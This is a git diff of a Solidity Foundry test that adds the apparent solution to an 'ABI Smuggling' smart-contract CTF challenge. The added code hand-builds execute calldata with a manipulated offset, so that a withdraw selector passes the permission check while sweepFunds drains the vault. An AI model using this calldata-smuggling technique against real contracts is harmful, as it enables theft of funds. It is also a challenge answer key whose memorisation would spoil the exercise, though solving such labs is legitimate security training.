@@ -69,11 +69,45 @@ contract ABISmugglingChallenge is Test {
         vault.withdraw(address(token), player, 1e18);
     }
 
-    /**
-     * CODE YOUR SOLUTION HERE
-     */
+    /*
+        The vault contract has a function called `execute` that allows authorized users to execute arbitrary 
+        calls on behalf of the vault. 
+        The function takes an array of targets, values, and data, and executes each call in order.
+        Thanks to the way the function is implemented, it's possible to smuggle in a call to the `sweepFunds` function
+    */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+
+        // Calldata de sweepFunds (what we want to smuggle in)
+        bytes memory sweepCalldata = abi.encodeWithSelector(
+            vault.sweepFunds.selector,
+            recovery,
+            token
+        );
+
+        // Craft the calldata for the execute function
+        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
+        bytes memory dataOffset = abi.encodePacked(uint256(0x80));
+        bytes memory emptyData = abi.encodePacked(uint256(0));
+        bytes memory actionDataLength = abi.encodePacked(uint256(sweepCalldata.length));
+        bytes memory withdrawSelectorPadded = abi.encodePacked(
+            bytes4(0xd9caed12),
+            bytes28(0)
+        );
+
+        // Full calldata payload
+        bytes memory calldataPayload = abi.encodePacked(
+            vault.execute.selector,
+            target,
+            dataOffset,
+            emptyData,
+            withdrawSelectorPadded,
+            actionDataLength,
+            sweepCalldata
+        );
+
+        // Call the execute function with the crafted calldata
+        address(vault).call(calldataPayload);
+
     }
 
     /**
